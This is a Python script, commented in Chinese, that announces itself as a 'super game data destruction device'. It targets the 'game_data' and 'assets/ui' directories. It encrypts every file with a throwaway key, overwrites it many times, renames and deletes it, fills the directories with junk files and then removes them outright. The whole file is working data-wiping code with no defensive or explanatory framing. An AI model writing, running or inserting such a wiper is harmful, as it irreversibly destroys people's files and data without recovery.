#!/usr/bin/env python3
import os
import random
import string
import shutil
from cryptography.fernet import Fernet

# 数据目录列表
DATA_DIRS = [
    'game_data',        # 游戏数据目录
    'assets/ui'         # 资源配置目录
]

# 生成加密密钥
def generate_key():
    return Fernet.generate_key()

# 多次覆盖文件内容
def overwrite_file(file_path, iterations=10):
    try:
        file_size = os.path.getsize(file_path)
        for i in range(iterations):
            # 生成不同类型的随机数据
            if i % 3 == 0:
                # 随机字符
                data = ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=file_size)).encode('utf-8')
            elif i % 3 == 1:
                # 全0数据
                data = b'\x00' * file_size
            else:
                # 全1数据
                data = b'\xff' * file_size
            
            # 写入数据
            with open(file_path, 'wb') as f:
                f.write(data)
        print(f"已多次覆盖文件: {file_path} (执行 {iterations} 次)")
        return True
    except Exception as e:
        print(f"覆盖文件失败 {file_path}: {e}")
        return False

# 加密文件
def encrypt_file(file_path, key):
    try:
        fernet = Fernet(key)
        
        # 读取文件内容
        with open(file_path, 'rb') as f:
            data = f.read()
        
        # 加密数据
        encrypted_data = fernet.encrypt(data)
        
        # 写入加密后的数据
        with open(file_path, 'wb') as f:
            f.write(encrypted_data)
        
        print(f"已加密文件: {file_path}")
        return True
    except Exception as e:
        print(f"加密文件失败 {file_path}: {e}")
        return False

# 粉碎文件
def shred_file(file_path):
    try:
        # 先多次覆盖
        overwrite_file(file_path, 20)
        
        # 重命名文件多次
        for i in range(5):
            new_name = file_path + '.' + ''.join(random.choices(string.ascii_letters, k=8))
            os.rename(file_path, new_name)
            file_path = new_name
        
        # 最后删除文件
        os.remove(file_path)
        print(f"已粉碎文件: {file_path}")
        return True
    except Exception as e:
        print(f"粉碎文件失败 {file_path}: {e}")
        return False

# 破坏目录结构
def corrupt_directory(directory):
    try:
        # 创建大量随机文件
        for i in range(50):
            random_file = os.path.join(directory, ''.join(random.choices(string.ascii_letters + string.digits, k=10)) + '.tmp')
            with open(random_file, 'wb') as f:
                f.write(''.join(random.choices(string.ascii_letters, k=1024)).encode('utf-8'))
        
        # 创建随机子目录
        for i in range(10):
            random_dir = os.path.join(directory, ''.join(random.choices(string.ascii_letters + string.digits, k=8)))
            os.makedirs(random_dir, exist_ok=True)
            # 在子目录中创建文件
            for j in range(5):
                random_file = os.path.join(random_dir, ''.join(random.choices(string.ascii_letters, k=8)) + '.tmp')
                with open(random_file, 'wb') as f:
                    f.write(''.join(random.choices(string.ascii_letters, k=512)).encode('utf-8'))
        
        print(f"已破坏目录结构: {directory}")
        return True
    except Exception as e:
        print(f"破坏目录结构失败 {directory}: {e}")
        return False

# 主函数
def main():
    print("超级游戏数据破坏装置启动")
    print("=" * 60)
    print("此操作将彻底破坏游戏数据，无法恢复！")
    print("=" * 60)
    
    # 生成加密密钥
    key = generate_key()
    print(f"生成的加密密钥: {key.decode('utf-8')}")
    print("注意: 此密钥用于加密数据，丢失后无法恢复数据")
    print("=" * 60)
    
    # 遍历所有数据目录
    all_files = []
    for data_dir in DATA_DIRS:
        if os.path.exists(data_dir):
            print(f"扫描目录: {data_dir}")
            for root, dirs, files in os.walk(data_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    all_files.append(file_path)
        else:
            print(f"目录不存在: {data_dir}")
    
    print(f"发现 {len(all_files)} 个文件待处理")
    print("开始彻底破坏数据...")
    print("=" * 60)
    
    # 处理每个文件
    for file_path in all_files:
        print(f"处理文件: {file_path}")
        
        # 1. 先加密文件
        encrypt_file(file_path, key)
        
        # 2. 再多次覆盖文件
        overwrite_file(file_path, 15)
        
        # 3. 最后粉碎文件
        shred_file(file_path)
    
    # 破坏每个目录结构
    for data_dir in DATA_DIRS:
        if os.path.exists(data_dir):
            corrupt_directory(data_dir)
    
    # 最后删除整个目录
    for data_dir in DATA_DIRS:
        if os.path.exists(data_dir):
            try:
                shutil.rmtree(data_dir)
                print(f"已删除整个目录: {data_dir}")
            except Exception as e:
                print(f"删除目录失败 {data_dir}: {e}")
    
    print("=" * 60)
    print("超级游戏数据破坏装置执行完成")
    print("所有游戏数据已被彻底破坏，无法恢复！")
    print("游戏数据目录已被删除")

if __name__ == '__main__':
    main()
